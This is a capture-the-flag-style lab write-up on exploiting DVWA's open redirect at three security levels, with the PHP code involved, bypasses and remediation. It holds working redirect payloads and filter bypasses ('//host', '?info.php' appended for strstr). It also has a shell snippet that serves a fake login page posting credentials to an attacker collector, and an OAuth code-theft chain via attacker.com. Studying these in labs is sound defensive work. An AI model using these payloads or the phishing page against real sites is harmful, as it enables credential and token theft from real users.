# Lab Write-Up: Open HTTP Redirect
**Date:** 2026-09-15  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Unvalidated Redirects and Forwards  
**OWASP Top 10:** A01:2021 – Broken Access Control  

---

## 1. Introduction

An Open Redirect vulnerability occurs when a web application accepts a user-controlled URL parameter and redirects the user to it without proper validation. Attackers exploit this to craft seemingly legitimate links from a trusted domain that secretly redirect victims to malicious sites — primarily for phishing, credential harvesting, or OAuth token theft.

**Goal of this lab:** Exploit the open redirect in DVWA to redirect a victim from the trusted DVWA domain to an external attacker-controlled site.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – Open HTTP Redirect Module     |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite                  |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Attacker Site**| `https://evil.example.com` (simulated) |

---

## 3. Vulnerability Overview

### What is an Open Redirect?

The DVWA redirect page takes a `redirect` parameter and sends the user to that URL. Without validation, an attacker can craft a URL like:

```
http://trusted-dvwa.com/redirect?redirect=http://evil.com
```

The victim sees `trusted-dvwa.com` in the link — which looks legitimate — but ends up on `evil.com`.

**Vulnerable Code (PHP):**
```php
$redirect = $_GET['redirect'];
header("Location: " . $redirect);
exit;
```

**Common attack scenarios:**
- Phishing: Redirect to a fake login page after showing the real site's URL
- OAuth token theft: Redirect in OAuth flows to steal authorization codes
- SSRF chaining: Use as part of a Server-Side Request Forgery attack

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → Open HTTP Redirect. Set security to **Low**.

#### Step 1 – Find the Redirect Endpoint

The module likely shows clickable links that redirect through a handler. Hover over a link to see:
```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=info.php
```

#### Step 2 – Test With External URL

Modify the `redirect` parameter to an external site:
```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=https://google.com
```

**Result:** Browser redirects to `https://google.com` ✅

**Open redirect confirmed!**

#### Step 3 – Craft Phishing URL

```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=http://192.168.x.x:8080/fake-login.html
```

Host a fake login page on Kali:
```bash
mkdir phishing
cat > phishing/fake-login.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>DVWA Login</title></head>
<body>
<h2>Session Expired - Please Log In Again</h2>
<form action="http://192.168.x.x:8081/collect" method="POST">
  Username: <input name="user" type="text"><br>
  Password: <input name="pass" type="password"><br>
  <input type="submit" value="Login">
</form>
</body>
</html>
EOF
python3 -m http.server 8080 -d phishing/
```

**Victim sees:** A DVWA-looking URL — clicks thinking it's safe → lands on attacker's fake login page.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** Absolute URLs (`https://`) are now blocked. The filter rejects full URLs.

```
?redirect=https://google.com
```
→ **Error:** "Absolute URLs are not allowed!"

#### Step 1 – Protocol-Relative URL Bypass

A URL starting with `//` is protocol-relative — the browser interprets it as the same protocol but different host:

```
?redirect=//google.com
```

**Result:** Redirect to `https://google.com` ✅

The filter blocked `https://` but missed `//domain` syntax.

#### Step 2 – Craft Attack URL

```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=//192.168.x.x:8080/fake-login.html
```

**Result:** Victim redirected to attacker's server.

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The filter now checks whether the URL contains the string `info.php` — an attempt to whitelist only internal redirects.

**Filter logic (approximate):**
```php
if (!strstr($redirect, "info.php")) {
    echo "You can only redirect to the info.php page.";
}
```

#### Step 1 – Test Basic Bypass (Blocked)

```
?redirect=https://google.com
```
→ Blocked.

#### Step 2 – Inject `info.php` as a Parameter

The filter uses `strstr()` which only checks if `info.php` appears **anywhere** in the string. We can inject it as a URL parameter that is ignored by the destination:

**Payload:**
```
?redirect=https://google.com?info.php
```

The string `info.php` appears in the URL → filter passes → browser redirects to `https://google.com`

**Result:** Redirect to `https://google.com` ✅

#### Step 3 – Full Phishing URL

```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=http://192.168.x.x:8080/fake-login.html?info.php
```

**Result:** Victim redirected to attacker's phishing page.

---

## 5. Real-World Attack Scenario (OAuth Token Theft)

Open redirects are particularly dangerous in OAuth flows:

```
1. Attacker registers redirect_uri=https://trusted.com/redirect?url=https://attacker.com
2. Sends victim to OAuth authorization with this redirect_uri
3. OAuth server validates trusted.com domain — passes
4. After authorization, redirects to trusted.com/redirect
5. DVWA redirects to attacker.com with the authorization code
6. Attacker steals the OAuth code and exchanges it for tokens
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Bypass Method               | Destination   |
|----------------|------------|-----------------------------|---------------|
| Low            | ✅ Yes     | Direct absolute URL         | External site |
| Medium         | ✅ Yes     | Protocol-relative URL `//`  | External site |
| High           | ✅ Yes     | Inject `info.php` as param  | External site |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Medium   |
| **CVSS Score** | 6.1      |
| **CIA Impact** | Confidentiality: Medium, Integrity: Medium, Availability: Low |

**Business Impact:**
- Phishing attacks using trusted domain names
- OAuth token and authorization code theft
- Reputation damage to the organization
- Used as a component in larger attack chains (SSRF, XSS)

---

## 8. Remediation Recommendations

| Fix                               | Description                                                      |
|-----------------------------------|------------------------------------------------------------------|
| **Whitelist of Allowed URLs**     | Only allow redirects to a predefined list of internal paths      |
| **Relative Paths Only**           | Only allow relative paths, not full URLs                        |
| **URL Validation Library**        | Use a proper URL parsing library to validate host                |
| **Indirect Redirect Mapping**     | Use numbered references: `?redirect=2` maps to an internal page  |
| **Warn Users of External Redirect** | Show an interstitial page warning about external redirects     |
| **Reject Parameterized Matching** | Don't use `strstr()` for security checks — use exact matching   |

**Secure Code (PHP):**
```php
// Vulnerable
header("Location: " . $_GET['redirect']);

// Secure – whitelist approach
$allowed_redirects = [
    'home'    => '/dvwa/index.php',
    'info'    => '/dvwa/info.php',
    'about'   => '/dvwa/about.php'
];

$key = $_GET['redirect'] ?? 'home';
if (!array_key_exists($key, $allowed_redirects)) {
    die('Invalid redirect destination');
}
header("Location: " . $allowed_redirects[$key]);
```

---

## 9. References

- [OWASP Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [PortSwigger – Open Redirection](https://portswigger.net/web-security/ssrf#open-redirect)
- [DVWA Open Redirect Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/open-redirect_dvwa_walkthrough/)
- [DVWA Open HTTP Redirect – cspanias](https://cspanias.github.io/posts/DVWA-Open-HTTP-Redirect)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – Open HTTP Redirect Module
Low:       ?redirect=https://google.com → Redirected externally
Medium:    ?redirect=//google.com → Protocol-relative bypass
High:      ?redirect=https://evil.com?info.php → strstr() bypass
Result:    Victim redirected to attacker's phishing site via trusted URL
Severity:  MEDIUM (CVSS 6.1)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
